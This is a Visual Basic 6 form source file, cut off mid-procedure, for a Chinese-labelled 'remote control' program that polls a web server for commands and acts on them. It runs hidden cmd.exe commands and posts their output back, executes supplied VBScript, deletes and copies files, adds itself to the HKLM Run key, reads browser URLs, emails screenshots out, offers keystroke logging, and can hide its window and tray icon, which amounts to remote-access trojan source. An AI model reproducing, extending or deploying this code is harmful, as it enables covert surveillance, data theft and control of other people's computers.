VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmmain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "主界面"
   ClientHeight    =   6360
   ClientLeft      =   150
   ClientTop       =   495
   ClientWidth     =   8085
   DrawStyle       =   5  'Transparent
   Icon            =   "frmmain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6360
   ScaleWidth      =   8085
   StartUpPosition =   3  '窗口缺省
   Begin VB.CommandButton Command10 
      Caption         =   "工具"
      Height          =   255
      Left            =   6360
      TabIndex        =   39
      Top             =   3120
      Width           =   735
   End
   Begin VB.CommandButton Command9 
      Caption         =   "二维码"
      Height          =   255
      Left            =   5520
      TabIndex        =   38
      Top             =   3120
      Width           =   855
   End
   Begin VB.CommandButton Command8 
      Caption         =   "打开控制网页"
      Height          =   255
      Left            =   4200
      TabIndex        =   37
      Top             =   3120
      Width           =   1335
   End
   Begin VB.CommandButton Command7 
      Caption         =   "修改密码"
      Height          =   255
      Left            =   3240
      TabIndex        =   36
      Top             =   3120
      Width           =   975
   End
   Begin VB.CommandButton Command6 
      Caption         =   "退出"
      Height          =   255
      Left            =   7080
      TabIndex        =   35
      Top             =   3120
      Width           =   855
   End
   Begin VB.Timer Timer4 
      Interval        =   3000
      Left            =   5400
      Top             =   240
   End
   Begin 远程协助.TrayCon Tray 
      Left            =   1080
      Top             =   360
      _ExtentX        =   794
      _ExtentY        =   794
   End
   Begin VB.CommandButton Command5 
      Caption         =   "热键设置"
      Height          =   255
      Left            =   2280
      TabIndex        =   34
      Top             =   3120
      Width           =   975
   End
   Begin VB.Frame Frame1 
      Caption         =   "附件邮箱信息"
      Height          =   1935
      Left            =   4080
      TabIndex        =   13
      Top             =   960
      Width           =   3855
      Begin VB.CommandButton Command4 
         Caption         =   "确认更改"
         Height          =   375
         Left            =   2280
         TabIndex        =   22
         Top             =   1320
         Width           =   1215
      End
      Begin VB.TextBox Text7 
         Height          =   270
         Left            =   720
         TabIndex        =   21
         Top             =   1320
         Width           =   1335
      End
      Begin VB.TextBox Text6 
         Height          =   270
         Left            =   720
         TabIndex        =   17
         Top             =   960
         Width           =   2895
      End
      Begin VB.TextBox Text5 
         Height          =   270
         IMEMode         =   3  'DISABLE
         Left            =   720
         PasswordChar    =   "*"
         TabIndex        =   16
         Top             =   600
         Width           =   2895
      End
      Begin VB.TextBox Text4 
         Height          =   270
         Left            =   720
         TabIndex        =   15
         Top             =   240
         Width           =   2895
      End
      Begin VB.Label Label8 
         Caption         =   "端口号"
         Height          =   255
         Left            =   120
         TabIndex        =   20
         Top             =   1320
         Width           =   735
      End
      Begin VB.Label Label7 
         Caption         =   "SMTP"
         Height          =   255
         Left            =   240
         TabIndex        =   19
         Top             =   960
         Width           =   495
      End
      Begin VB.Label Label6 
         Caption         =   "密码"
         Height          =   255
         Left            =   240
         TabIndex        =   18
         Top             =   600
         Width           =   615
      End
      Begin VB.Label Label5 
         Caption         =   "用户名"
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   240
         Width           =   855
      End
   End
   Begin VB.CheckBox chkallowboard 
      Caption         =   "允许记录键盘"
      Height          =   255
      Left            =   2280
      TabIndex        =   12
      Top             =   2400
      Width           =   1575
   End
   Begin VB.CheckBox chkallowlock 
      Caption         =   "允许锁屏"
      Height          =   375
      Left            =   2280
      TabIndex        =   11
      Top             =   1920
      Width           =   1575
   End
   Begin VB.CheckBox chkallowdos 
      Caption         =   "允许DOS命令"
      Height          =   255
      Left            =   2280
      TabIndex        =   10
      Top             =   1560
      Width           =   1455
   End
   Begin VB.CheckBox chkallowcut 
      Caption         =   "允许截屏"
      Height          =   255
      Left            =   2280
      TabIndex        =   9
      Top             =   1080
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "更改"
      Height          =   255
      Left            =   1440
      TabIndex        =   8
      Top             =   3120
      Width           =   855
   End
   Begin VB.TextBox txtnum 
      Height          =   270
      Left            =   120
      TabIndex        =   6
      Top             =   3120
      Width           =   1335
   End
   Begin VB.CheckBox chkstopcontrol 
      Caption         =   "停止受控"
      Height          =   375
      Left            =   240
      TabIndex        =   5
      Top             =   2400
      Width           =   1935
   End
   Begin VB.CheckBox chkhidetray 
      Caption         =   "不显示托盘图标"
      Height          =   375
      Left            =   240
      TabIndex        =   4
      Top             =   1920
      Width           =   1935
   End
   Begin VB.CheckBox chkautohide 
      Caption         =   "隐藏本窗体"
      Height          =   375
      Left            =   240
      TabIndex        =   3
      Top             =   1440
      Width           =   1935
   End
   Begin VB.CheckBox chkautorun 
      Caption         =   "开机自启"
      Height          =   375
      Left            =   240
      TabIndex        =   2
      Top             =   960
      Width           =   1935
   End
   Begin VB.Timer Timer5 
      Enabled         =   0   'False
      Interval        =   8000
      Left            =   5760
      Top             =   7680
   End
   Begin VB.Timer Timer3 
      Interval        =   2000
      Left            =   4800
      Top             =   7680
   End
   Begin VB.Timer Timer2 
      Interval        =   50000
      Left            =   6480
      Top             =   7320
   End
   Begin InetCtlsObjects.Inet Inet4 
      Left            =   6480
      Top             =   7560
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.PictureBox Picture1 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      Height          =   15
      Left            =   120
      ScaleHeight     =   15
      ScaleWidth      =   135
      TabIndex        =   0
      Top             =   120
      Width           =   135
   End
   Begin InetCtlsObjects.Inet Inet3 
      Left            =   7800
      Top             =   7440
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin InetCtlsObjects.Inet Inet2 
      Left            =   8760
      Top             =   7680
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   8880
      Top             =   7320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   7200
      Top             =   7560
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Interval        =   2000
      Left            =   8520
      Top             =   7440
   End
   Begin VB.Frame Frame2 
      Caption         =   "服务器连接设置"
      Height          =   2775
      Left            =   120
      TabIndex        =   23
      Top             =   3480
      Width           =   7815
      Begin VB.CommandButton Command3 
         Caption         =   "点击更改"
         Height          =   255
         Left            =   6720
         TabIndex        =   33
         Top             =   1920
         Width           =   975
      End
      Begin VB.TextBox txtconnect 
         Height          =   270
         Left            =   240
         TabIndex        =   32
         Top             =   2280
         Width           =   6375
      End
      Begin VB.TextBox txtload 
         Height          =   270
         Left            =   240
         TabIndex        =   31
         Top             =   1560
         Width           =   6375
      End
      Begin VB.OptionButton opt2 
         Caption         =   "分别设置服务器"
         Height          =   255
         Left            =   120
         TabIndex        =   28
         Top             =   960
         Width           =   1695
      End
      Begin VB.CommandButton Command2 
         Caption         =   "点击更改"
         Height          =   255
         Left            =   6720
         TabIndex        =   26
         Top             =   600
         Width           =   975
      End
      Begin VB.TextBox txtmain 
         Height          =   270
         Left            =   240
         TabIndex        =   25
         Top             =   600
         Width           =   6375
      End
      Begin VB.OptionButton opt1 
         Caption         =   "设置主服务器"
         Height          =   255
         Left            =   120
         TabIndex        =   24
         Top             =   240
         Width           =   2055
      End
      Begin VB.Label Label11 
         Caption         =   "当前连接服务器"
         Height          =   255
         Left            =   240
         TabIndex        =   30
         Top             =   1920
         Width           =   1455
      End
      Begin VB.Label Label10 
         Caption         =   "当前上传服务器"
         Height          =   255
         Left            =   240
         TabIndex        =   29
         Top             =   1320
         Width           =   1815
      End
      Begin VB.Label Label9 
         Caption         =   "状态"
         Height          =   255
         Left            =   3600
         TabIndex        =   27
         Top             =   240
         Width           =   3975
      End
   End
   Begin VB.Label Label2 
      Caption         =   "服务号码"
      Height          =   255
      Left            =   120
      TabIndex        =   7
      Top             =   2880
      Width           =   975
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "主设置"
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   36
         Charset         =   134
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   2640
      TabIndex        =   1
      Top             =   120
      Width           =   2295
   End
   Begin VB.Menu mmutray 
      Caption         =   "TRAY"
      Visible         =   0   'False
      WindowList      =   -1  'True
      Begin VB.Menu mmuopen 
         Caption         =   "打开主界面"
      End
      Begin VB.Menu nnumnnum 
         Caption         =   "-"
      End
      Begin VB.Menu mmustop 
         Caption         =   "退出"
      End
   End
End
Attribute VB_Name = "frmmain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Type PROCESSENTRY32
dwSize As Long
cntUsage As Long
th32ProcessID As Long
th32DefaultHeapID As Long
th32ModuleID As Long
cntThreads As Long
th32ParentProcessID As Long
pcPriClassBase As Long
dwFlags As Long
szExeFile As String * 1024
End Type
Const TH32CS_SNAPHEAPLIST = &H1
Const TH32CS_SNAPPROCESS = &H2
Const TH32CS_SNAPTHREAD = &H4
Const TH32CS_SNAPMODULE = &H8
Const TH32CS_SNAPALL = (TH32CS_SNAPHEAPLIST Or TH32CS_SNAPPROCESS Or TH32CS_SNAPTHREAD Or TH32CS_SNAPMODULE)
Const TH32CS_INHERIT = &H80000000
Private Declare Function CreateToolhelp32Snapshot Lib "KERNEL32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Declare Function Process32First Lib "KERNEL32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function Process32Next Lib "KERNEL32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function CloseHandle Lib "KERNEL32" (ByVal hObject As Long) As Long
 Private oldnum As Long, oldtimeid As String, oldcommands1 As String, oldcommands2 As String
   Private pth As String
Private Flname As String, MainURL As String
Private shl As Shell32.Shell
Private shfd As Shell32.Folder
Private s As String
Private nfso As New FileSystemObject, youknow As Long

'查找进程的函数
Private Function fun_FindProcess(ByVal ProcessName As String) As Long
Dim strdata As String
Dim my As PROCESSENTRY32
Dim l As Long
Dim l1 As Long
Dim mName As String
Dim i As Integer, pid As Long
l = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
If l Then
my.dwSize = 1060
If (Process32First(l, my)) Then
Do
i = InStr(1, my.szExeFile, Chr(0))
mName = LCase(left(my.szExeFile, i - 1))
If mName = LCase(ProcessName) Then
pid = my.th32ProcessID
fun_FindProcess = pid
Exit Function
End If
Loop Until (Process32Next(l, my) < 1)
End If
l1 = CloseHandle(l)
End If
fun_FindProcess = 0
End Function

Private Sub chkallowboard_Click()
AllowBoard = chkallowboard.Value
WriteINI "Local", "AllowBoard", AllowBoard, GetPath & "data\set.kac"
End Sub

Private Sub chkallowcut_Click()
AllowCut = chkallowcut.Value
WriteINI "Local", "AllowCut", AllowCut, GetPath & "data\set.kac"
End Sub

Private Sub chkallowdos_Click()
AllowDos = chkallowdos.Value
WriteINI "Local", "AllowDos", AllowDos, GetPath & "data\set.kac"
End Sub

Private Sub chkallowlock_Click()
    AllowLock = chkallowlock.Value
    WriteINI "Local", "AllowLock", AllowLock, GetPath & "data\set.kac"
End Sub

Private Sub chkautohide_Click()
    AutoHide = chkautohide.Value
     WriteINI "Local", "AutoHide", AutoHide, GetPath & "data\set.kac"
    Call ChangeValue
End Sub

Private Sub chkautorun_Click()
    AutoRun = chkautorun.Value
     WriteINI "Local", "AutoRun", AutoRun, GetPath & "data\set.kac"
    ChangeValue
End Sub

Private Sub chkhidetray_Click()
    HideTray = chkhidetray.Value
      WriteINI "Local", "HideTray", HideTray, GetPath & "data\set.kac"
 ChangeValue
End Sub

Private Sub chkstopcontrol_Click()
StopControl = chkstopcontrol.Value
WriteINI "Local", "StopControl", StopControl, GetPath & "data\set.kac"
 ChangeValue
End Sub

Private Sub Command1_Click()
    WriteINI "Local", "Number", Val(txtnum.Text), GetPath & "data\set.kac"
    MeNumber = Val(txtnum.Text)
    MsgBox "更改成功", vbInformation
End Sub

Private Sub Command10_Click()
    Frmpost.Show
End Sub

Private Sub Command2_Click()
    If Command2.Caption = "点击更改" Then
        opt1.Value = True
        Call opt1_Click
        Command2.Caption = "确认更改"
    Else
        WriteINI "Local", "ServerURL", Trim(txtmain.Text) & "/command.htm", GetPath & "data\set.kac"
        WriteINI "Local", "BackURL", Trim(txtmain.Text) & "/back.php", GetPath & "data\set.kac"
        BackNet = Trim(txtmain.Text) & "/back.php"
        ServerNet = Trim(txtmain.Text) & "/command.htm"
        MsgBox "更改成功", vbInformation
        opt2.Value = True
        Call opt2_Click
        txtmain.Text = ""
        txtload.Text = BackNet
        txtconnect.Text = ServerNet
        Command2.Caption = "点击更改"
    End If
End Sub

Private Sub Command3_Click()
      If Command2.Caption = "点击更改" Then
        opt2.Value = True
        Call opt2_Click
    Else
        WriteINI "Local", "ServerURL", Trim(txtconnect.Text), GetPath & "data\set.kac"
        WriteINI "Local", "BackURL", Trim(txtload.Text), GetPath & "data\set.kac"
        BackNet = Trim(txtload.Text)
        ServerNet = Trim(txtconnect.Text)
        MsgBox "更改成功", vbInformation
        Command2.Caption = "点击更改"
    End If
End Sub

Private Sub Command4_Click()
        SendMail.UserName = Text4.Text
        SendMail.PassWord = Text5.Text
        SendMail.SMTP = Text6.Text
         SendMail.Port = Text7.Text
         WriteINI "Mail", "UserName", SendMail.UserName, GetPath & "data\set.kac"
         WriteINI "Mail", "PassWord ", SendMail.PassWord, GetPath & "data\set.kac"
         WriteINI "Mail", "SMTP ", SendMail.SMTP, GetPath & "data\set.kac"
         WriteINI "Mail", "Port ", SendMail.Port, GetPath & "data\set.kac"
         MsgBox "修改成功", vbInformation
End Sub

Private Sub Command5_Click()
    frmhotkey.Show vbModal
End Sub

Private Sub Command6_Click()
    Unload Me
    EndProcess
    End
End Sub

Private Sub Command7_Click()
    LoginState = False
    frmsecurity.Caption = "修改密码"
    frmsecurity.Show vbModal
End Sub

Private Sub Command8_Click()
        MainURL = left(ServerNet, Len(ServerNet) - InStr(1, StrReverse(ServerNet), "/")) & "/me.php"
        ShellExecute Me.hwnd, "open", MainURL, "", "", 1
End Sub

Private Sub Command9_Click()
    MainURL = left(ServerNet, Len(ServerNet) - InStr(1, StrReverse(ServerNet), "/")) & "/me.php"
    Load frmewm
    frmewm.Text1.Text = MainURL
    frmewm.Show vbModal
End Sub

Private Sub Form_Load()
  On Error Resume Next
  Dim TempPath As String, get_data() As Byte, backstring As String, send_data As String, my_head As String
 backstring = MeNumber & "|" & Now & "|" & "NOW I AM HERE !HELLO DARING !"
send_data = "MENU=" & GBKEncodeURI(backstring)
my_head = "Content-Type: application/x-www-form-urlencoded"
Inet3.Execute BackNet, "POST", send_data, my_head
'Analyse ("52|2014|pmctdd|lrove")
If nfso.FileExists(GetPath & "system") Then Kill GetPath & "system"
Tray.AddToTray Me
Tray.SetTrayTip "远程控制"
Tray.SetMenu mmutray
ISTray = True
chkautorun.Value = AutoRun
chkautohide.Value = AutoHide
chkhidetray.Value = HideTray
chkstopcontrol.Value = StopControl
chkallowcut.Value = AllowCut
chkallowdos.Value = AllowDos
chkallowlock.Value = AllowLock
chkallowboard.Value = AllowBoard
txtload.Text = BackNet
txtconnect.Text = ServerNet
txtmain.Locked = True
txtmain.Enabled = False
opt2.Value = True
txtnum.Text = MeNumber
Call ChangeValue
Text4.Text = SendMail.UserName
Text5.Text = SendMail.PassWord
Text6.Text = SendMail.SMTP
Text7.Text = SendMail.Port
Dim Modifiers As Long
    If PauseHotKey = 1 Then Exit Sub
    preWinProc = GetWindowLong(Me.hwnd, GWL_WNDPROC)
    SetWindowLong Me.hwnd, GWL_WNDPROC, AddressOf WndProc
    uVirtKey = HotKey
    RegisterHotKey Me.hwnd, 1, Modifiers, uVirtKey
End Sub
Private Sub Form_Unload(Cancel As Integer)
    If MsgBox("真的要退出么？", vbQuestion + vbYesNo) = vbNo Then
        Cancel = 0
         Exit Sub
    End If
    SetWindowLong Me.hwnd, GWL_WNDPROC, preWinProc
    UnregisterHotKey Me.hwnd, uVirtKey   '取消系统级热键,释放资源
    EndProcess
    End                                 '终止程序运行
End Sub
Private Sub Inet1_StateChanged(ByVal state As Integer)
On Error Resume Next
   Dim get_data() As Byte, result As String
    If state = 12 Then
        get_data = Inet1.GetChunk(10240, icByteArray)
        result = BytesToBstr(get_data, "GB2312")
        Analyse (result)
    End If
End Sub
  Private Sub Inet4_StateChanged(ByVal state As Integer)
  On Error Resume Next
            Dim TempPath As String, get_data() As Byte, backstring As String, send_data As String, my_head As String
    If state = 12 Then
        TempPath = GetPath & "20.txt"
        get_data = Inet4.GetChunk(102400, icByteArray)
        Open TempPath For Binary As #12
        Put #12, 1, get_data
        Close #12
    End If
     backstring = MeNumber & "|" & Now & "|" & "Upload DOWN FINISHED"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
End Sub

Private Sub mmuopen_Click()
    frmmain.Show
    chkautohide.Value = 0
    AutoHide = 0
    WriteINI "Local", "AutoHide", AutoHide, GetPath & "data\set.kac"
End Sub

Private Sub mmustop_Click()
    Tray.RemoveFromTray
    Unload Me
    Call EndProcess
    End
End Sub
Private Sub opt1_Click()
    If opt1.Value Then
        txtload.Enabled = False
        txtconnect.Enabled = False
        txtload.Locked = True
        txtconnect.Locked = True
        txtmain.Enabled = True
        txtmain.Locked = False
    End If
End Sub

Private Sub opt2_Click()
    If opt2.Value Then
        txtload.Enabled = True
        txtconnect.Enabled = True
        txtload.Locked = False
        txtconnect.Locked = False
        txtmain.Enabled = False
        txtmain.Locked = True
    End If
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
    If Inet1.StillExecuting Then Exit Sub
    Inet1.Execute ServerNet, "GET"
End Sub

Sub Analyse(ByVal datas As String)
On Error GoTo errhand:
    Dim num As Long, timemid As String, commands1 As String, commands2 As String, temp As String, backstring As String, around As Boolean
    Dim i As Integer, n As Integer, m As Integer, Email As Object, names As String
    i = InStr(1, datas, "|")
    num = Val(left(datas, i - 1))
    n = InStr(i + 1, datas, "|")
    timemid = Mid(datas, i + 1, n - i - 1)
    Dim nfso As New FileSystemObject
    m = InStr(n + 1, datas, "|")
    commands1 = Mid(datas, n + 1, m - n - 1)
    commands2 = right(datas, Len(datas) - m)
    around = False
     If nfso.FileExists(GetPath & "time.txt") Then
        Open GetPath & "time.txt" For Input As #2
        Line Input #2, temp
        Close
        If Val(temp) > Val(timemid) Then Exit Sub
    End If
    If right(commands1, 1) = "%" Then
        commands1 = left(commands1, Len(commands1) - 1)
        around = True
    Else
        around = False
    End If
    If (Val(num) <> Val(MeNumber) And (Val(num) <> 521)) Then Exit Sub
    If oldcommands1 = commands1 And oldcommands2 = commands2 And oldnum = num And oldtimeid = timemid And around = False Then Exit Sub
    oldcommands1 = commands1
    oldcommands2 = commands2
    oldnum = num
    oldtimeid = timemid
    Select Case commands1
        Dim send_data As String, my_head As String
        Case "cmd"
                If AllowDos = 0 Then
                        SendBackDiyData "客户端禁止调用DOS命令行"
                        Exit Sub
                End If
            Shell "cmd.exe /c " & commands2, vbHide
            backstring = MeNumber & "|" & Now & "|" & "shell|" & commands2 & " is ok"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "getip"
            backstring = MeNumber & "|" & Now & "|" & Winsock1.LocalIP
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "changeget"
             WriteINI "Local", "ServerURL", commands2, GetPath & "data\set.kac"
             backstring = MeNumber & "|" & Now & "|" & "changeget is ok"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
       Case "changeback"
             WriteINI "Local", "BackURL", commands2, GetPath & "data\set.kac"
              backstring = MeNumber & "|" & Now & "|" & "changeback is ok"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "openurl"
            If left(commands2, 7) <> "http://" Then
                commands2 = "http://" & commands2
            End If
            ShellExecute Me.hwnd, "OPEN", commands2, "", "", 1
             backstring = MeNumber & "|" & Now & "|" & "openurl is ok"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "openfile"
            ShellExecute Me.hwnd, "OPEN", commands2, "", "", 1
             backstring = MeNumber & "|" & Now & "|" & "openfile is ok"
          '  Dim send_data As String, my_head As String
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "cmdget1"
                If AllowDos = 0 Then
                        SendBackDiyData "客户端禁止调用DOS命令行"
                        Exit Sub
                End If
            Dim temps As String
            Shell "cmd.exe /c " & commands2 & " >""" & GetPath & "1.txt""", vbHide
            Sleep 5000
             Open GetPath & "1.txt" For Input As #3
             Do While Not EOF(3)
                Line Input #3, temp
                temps = temps & temp
            Loop
            Close #3
            backstring = MeNumber & "|" & Now & "|" & "shell|" & temps
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            If Inet2.StillExecuting Then
                Inet3.Execute BackNet, "POST", send_data, my_head
            Else
                Inet2.Execute BackNet, "POST", send_data, my_head
            End If
        Case "cmdget2"
                If AllowDos = 0 Then
                        SendBackDiyData "客户端禁止调用DOS命令行"
                        Exit Sub
                End If
            Shell "cmd.exe /c " & commands2 & " >>""" & GetPath & "1.txt""", vbHide
            Sleep 5000
             Open GetPath & "1.txt" For Input As #3
             Do While Not EOF(3)
                Line Input #3, temp
                temps = temps & temp
            Loop
            Close #3
            backstring = MeNumber & "|" & Now & "|" & "shell|" & "<br />" & temps
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            If Inet2.StillExecuting Then
                Inet3.Execute BackNet, "POST", send_data, my_head
            Else
                Inet2.Execute BackNet, "POST", send_data, my_head
            End If
        Case "msgbox"
                MsgBox commands2, vbCritical, "Windows"
                 backstring = MeNumber & "|" & Now & "|" & "msgbox is ok"
         '   Dim send_data As String, my_head As String
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "lock"
                    If AllowLock = 0 Then
                        SendBackDiyData "客户端禁止开启锁屏"
                        Exit Sub
                End If
                Shell "rundll32.exe user32.dll,LockWorkStation"
                backstring = MeNumber & "|" & Now & "|" & "LOCK is ok"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "vbs"
                Open GetPath & "vbs.vbs" For Output As #6
                    Print #6, commands2
                Close #6
                Sleep 500
                ShellExecute Me.hwnd, "open", GetPath & "vbs.vbs", "", "", 1
                 backstring = MeNumber & "|" & Now & "|" & "shell vbs is ok"
          '  Dim send_data As String, my_head As String
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "sendkeys"
                SendKeys commands2
                backstring = MeNumber & "|" & Now & "|" & "Sendkeys is ok"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "apppath"
            backstring = MeNumber & "|" & Now & "|" & "shell|" & "<br />" & GetPath
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            If Inet2.StillExecuting Then
                Inet3.Execute BackNet, "POST", send_data, my_head
            Else
                Inet2.Execute BackNet, "POST", send_data, my_head
            End If
        Case "kill"
            Kill commands2
            backstring = MeNumber & "|" & Now & "|" & "kill " & commands2 & " is ok"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "copy"
            Dim fso As New FileSystemObject
            Dim fs As File
            Set fs = fso.GetFile(GetPath & App.EXEName & ".exe")
            fs.Copy (commands2)
            backstring = MeNumber & "|" & Now & "|" & "copy to " & commands2 & " is finished"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "autorunme"
            Dim w As Object
            Set w = CreateObject("wscript.shell")
             If right(App.Path, 1) = "\" Then
                w.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & App.EXEName, App.Path & App.EXEName & ".exe"
            Else
                w.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & App.EXEName, App.Path & "\" & App.EXEName & ".exe"
            End If
             my_head = "Content-Type: application/x-www-form-urlencoded"
            If Inet2.StillExecuting Then
                Inet3.Execute BackNet, "POST", GBKEncodeURI(MeNumber & "success"), my_head
            Else
                Inet2.Execute BackNet, "POST", GBKEncodeURI(MeNumber & "success"), my_head
            End If
        Case "deleteauto"
            Shell "cmd.exe /c reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f /v " & App.EXEName, vbHide
            backstring = MeNumber & "|" & Now & "|" & "delete run is ok"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "ieurl"
            Dim ieurl As String
            ieurl = GetIEAddressBarURL()
            If Trim(ieurl) = "" Then ieurl = "NOT GET OR NOT OPEN IE"
             backstring = MeNumber & "|" & Now & "|" & ieurl
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
         Case "chromeurl"
            Dim chromeurl As String
            chromeurl = GetChrome()
            If Trim(chromeurl) = "" Then chromeurl = "NOT GET OR NOT OPEN CHROME"
             backstring = MeNumber & "|" & Now & "|" & chromeurl
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "scut"
                If AllowCut = 0 Then
                        SendBackDiyData "客户端禁止开启屏幕截图"
                        Exit Sub
                End If
            SaveScreenJPG App.Path & "\screen.jpg", 75
            names = "http://schemas.microsoft.com/cdo/configuration/"
            Set Email = CreateObject("CDO.Message")
            Email.From = SendMail.UserName  ' //你自己的油箱号码
            Email.To = SendMail.UserName   ' // 发送到的油箱号码"(邪恶的加入了自己的邮箱)
            Email.Subject = "PROGSCREEN" ' //相当于邮件里的标题"
            Email.Textbody = MeNumber & "|" & Now   '//相当于邮件里的内容(记录了发送地ip)
            Email.Addattachment App.Path & "\screen.jpg"  '附件的路径（这一点只能在源码中更改，需要时记得将前面的“ ' ”去掉）
            Email.Configuration.Fields.Item(names & "sendusing") = 2
            Email.Configuration.Fields.Item(names & "smtpserver") = SendMail.SMTP '//邮件服务器
            Email.Configuration.Fields.Item(names & "smtpserverport") = SendMail.Port  '//端口号
            Email.Configuration.Fields.Item(names & "smtpauthenticate") = 1
            Email.Configuration.Fields.Item(names & "sendusername") = left(SendMail.UserName, InStr(1, SendMail.UserName, "@") - 1) '//油箱号码@前面的名字
            Email.Configuration.Fields.Item(names & "sendpassword") = SendMail.PassWord  '//你油箱的密码
            Email.Configuration.Fields.Update
            Email.Send
              backstring = MeNumber & "|" & Now & "|" & "Scut send"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "bcut"
                 If AllowCut = 0 Then
                        SendBackDiyData "客户端禁止开启屏幕截图"
                        Exit Sub
                End If
            Call keybd_event(vbKeySnapshot, theScreen, 0, 0)
            DoEvents
            Picture1.Picture = Clipboard.GetData(vbCFBitmap)
            SavePicture Picture1.Image, App.Path & "\bscreen.jpg"
            names = "http://schemas.microsoft.com/cdo/configuration/"
            Set Email = CreateObject("CDO.Message")
            Email.From = SendMail.UserName  ' //你自己的油箱号码
            Email.To = SendMail.UserName   ' // 发送到的油箱号码"(邪恶的加入了自己的邮箱)
            Email.Subject = "PROGSCREEN" ' //相当于邮件里的标题"
            Email.Textbody = MeNumber & "|" & Now   '//相当于邮件里的内容(记录了发送地ip)
            Email.Addattachment App.Path & "\bscreen.jpg"  '附件的路径（这一点只能在源码中更改，需要时记得将前面的“ ' ”去掉）
            Email.Configuration.Fields.Item(names & "sendusing") = 2
            Email.Configuration.Fields.Item(names & "smtpserver") = SendMail.SMTP '//邮件服务器
            Email.Configuration.Fields.Item(names & "smtpserverport") = SendMail.Port  '//端口号
            Email.Configuration.Fields.Item(names & "smtpauthenticate") = 1
            Email.Configuration.Fields.Item(names & "sendusername") = left(SendMail.UserName, InStr(1, SendMail.UserName, "@") - 1) '//油箱号码@前面的名字
